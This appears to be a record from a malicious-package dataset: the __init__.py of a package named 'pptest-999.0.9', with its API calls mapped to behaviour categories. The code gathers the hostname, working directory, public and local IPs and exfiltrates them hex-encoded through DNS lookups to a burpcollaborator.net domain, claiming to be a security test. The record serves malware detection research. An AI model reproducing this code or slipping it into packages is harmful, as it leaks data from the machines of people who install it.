[
  {
    "pyfile": "__init__.py",
    "code_snippet": "import os\nimport sys\nimport socket\nimport dns.resolver\nimport hashlib\nimport json\n\nPAYLOADS_LENGTH = 60\n\npython_version = '{0[0]}.{0[1]}.{0[2]}'.format(sys.version_info)\nfake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\n\ndef get_wan_ip():\n    public_ip = ''\n    try:\n        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'}\n        HTTP_proxy = os.getenv('HTTP_PROXY')\n        HTTPS_proxy = os.getenv('HTTPS_PROXY')\n        if HTTP_proxy and lHTTPS_proxy :\n            proxies = {\"http\": HTTP_proxy, \"https\": HTTPS_proxy}\n        else:\n            proxies={}\n        if python_version >= '3.0':\n            import urllib.request\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n            res = opener.open(req)\n            str_ = res.read().decode('utf-8')\n            public_ip = json.loads(str_)['IP']\n            print(public_ip)\n        else:\n            import urllib2\n            handler = urllib2.ProxyHandler(proxies)\n            opener = urllib2.build_opener(handler)\n            req = urllib2.Request('http://ifconfig.me/ip')\n            public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']\n    except Exception as err:\n        print(err)\n        public_ip = os.system('curl -s \"http://ifconfig.me/ip\"')\n    return public_ip\n\ndef get_info(dns_server):\n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    local_ip_str = ''\n    for i in local_ips:\n        if isinstance(i, str):\n            local_ip_str = local_ip_str + ','\n        elif isinstance(i, list):\n            local_ip_str = local_ip_str + ','.join(i)\n    print(local_ip_str)\n    my_resolver = dns.resolver.Resolver(configure=False)\n    my_resolver.nameservers = [dns_server]\n    my_resolver.port = 53\n    payload = hostname+'|'+os.getcwd()+'|'+str(get_wan_ip())+'|'+local_ip_str\n    payload_to_send = payload\n    print(payload)\n    checksum = hashlib.sha1(payload_to_send.encode('utf-8')).hexdigest()\n    print(checksum)\n    b=''.join(hex(ord(x))[2:] for x in payload_to_send)\n    i = 0\n    while i < len(b):\n        bb = b[i:i+PAYLOADS_LENGTH-len(fake_domain)-1]+'.'+fake_domain\n        i = i + PAYLOADS_LENGTH-len(fake_domain)-1\n        answer = my_resolver.resolve(bb, 'A')\n\ndef mypip():\n    mydns = '8.8.8.8'\n    get_info(mydns)\n    print('!!!Attention: it is just a security test. Reinstall pip now.!!!')",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "os.getenv",
        "os.getcwd",
        "os.getcwd",
        "os.system",
        "socket.gethostname",
        "socket.gethostbyname_ex",
        "os.getcwd",
        "get_wan_ip",
        "dns.resolver.Resolver",
        "dns.resolver.Resolver.nameservers",
        "dns.resolver.Resolver.port",
        "dns.resolver.Resolver.resolve",
        "hashlib.sha1",
        "hashlib.sha1.hexdigest"
      ],
      "api_sequence_with_args": [
        "os.getenv('HTTP_PROXY')",
        "os.getenv('HTTPS_PROXY')",
        "os.getcwd()",
        "os.getcwd()",
        "os.system('curl -s \"http://ifconfig.me/ip\"')",
        "socket.gethostname()",
        "socket.gethostbyname_ex(hostname)",
        "os.getcwd()",
        "get_wan_ip()",
        "dns.resolver.Resolver(configure=False)",
        "my_resolver.nameservers = [dns_server]",
        "my_resolver.port = 53",
        "my_resolver.resolve(bb, 'A')",
        "hashlib.sha1(payload_to_send.encode('utf-8'))",
        "hashlib.sha1(payload_to_send.encode('utf-8')).hexdigest()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname_ex",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "get_wan_ip",
          "id": "get_public_ip",
          "description": "Retrieves public IP address using HTTP request",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "dns.resolver.Resolver",
          "id": "create_dns_resolver",
          "description": "Creates DNS resolver object with custom configuration",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "dns.resolver.Resolver.nameservers",
          "id": "create_dns_resolver",
          "description": "Creates DNS resolver object with custom configuration",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "dns.resolver.Resolver.port",
          "id": "create_dns_resolver",
          "description": "Creates DNS resolver object with custom configuration",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "dns.resolver.Resolver.resolve",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "hashlib.sha1",
          "id": "create_sha1_hash",
          "description": "Creates SHA-1 hash object from encoded string",
          "first_id": "encryption_hashing",
          "second_id": "hash_calculation",
          "third_id": "hash_object_creation"
        },
        {
          "api_name": "hashlib.sha1.hexdigest",
          "id": "get_sha1_digest",
          "description": "Returns hexadecimal digest of SHA-1 hash",
          "first_id": "encryption_hashing",
          "second_id": "hash_calculation",
          "third_id": "hash_value_retrieval"
        }
      ],
      "contextual_code": "import os\nimport sys\nimport socket\nimport dns.resolver\nimport hashlib\nimport json\n\nPAYLOADS_LENGTH = 60\n\npython_version = '{0[0]}.{0[1]}.{0[2]}'.format(sys.version_info)\nfake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\n\ndef get_wan_ip():\n    public_ip = ''\n    try:\n        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'}\n        HTTP_proxy = os.getenv('HTTP_PROXY')\n        HTTPS_proxy = os.getenv('HTTPS_PROXY')\n        if HTTP_proxy and lHTTPS_proxy :\n            proxies = {\"http\": HTTP_proxy, \"https\": HTTPS_proxy}\n        else:\n            proxies={}\n        if python_version >= '3.0':\n            import urllib.request\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n            res = opener.open(req)\n            str_ = res.read().decode('utf-8')\n            public_ip = json.loads(str_)['IP']\n            print(public_ip)\n        else:\n            import urllib2\n            handler = urllib2.ProxyHandler(proxies)\n            opener = urllib2.build_opener(handler)\n            req = urllib2.Request('http://ifconfig.me/ip')\n            public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']\n    except Exception as err:\n        print(err)\n        public_ip = os.system('curl -s \"http://ifconfig.me/ip\"')\n    return public_ip\n\ndef get_info(dns_server):\n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    local_ip_str = ''\n    for i in local_ips:\n        if isinstance(i, str):\n            local_ip_str = local_ip_str + ','\n        elif isinstance(i, list):\n            local_ip_str = local_ip_str + ','.join(i)\n    print(local_ip_str)\n    my_resolver = dns.resolver.Resolver(configure=False)\n    my_resolver.nameservers = [dns_server]\n    my_resolver.port = 53\n    payload = hostname+'|'+os.getcwd()+'|'+str(get_wan_ip())+'|'+local_ip_str\n    payload_to_send = payload\n    print(payload)\n    checksum = hashlib.sha1(payload_to_send.encode('utf-8')).hexdigest()\n    print(checksum)\n    b=''.join(hex(ord(x))[2:] for x in payload_to_send)\n    i = 0\n    while i < len(b):\n        bb = b[i:i+PAYLOADS_LENGTH-len(fake_domain)-1]+'.'+fake_domain\n        i = i + PAYLOADS_LENGTH-len(fake_domain)-1\n        answer = my_resolver.resolve(bb, 'A')\n\ndef mypip():\n    mydns = '8.8.8.8'\n    get_info(mydns)\n    print('!!!Attention: it is just a security test. Reinstall pip now.!!!')"
    }
  },
  {
    "metadata": {
      "package_name": "pptest-999.0.9"
    }
  }
]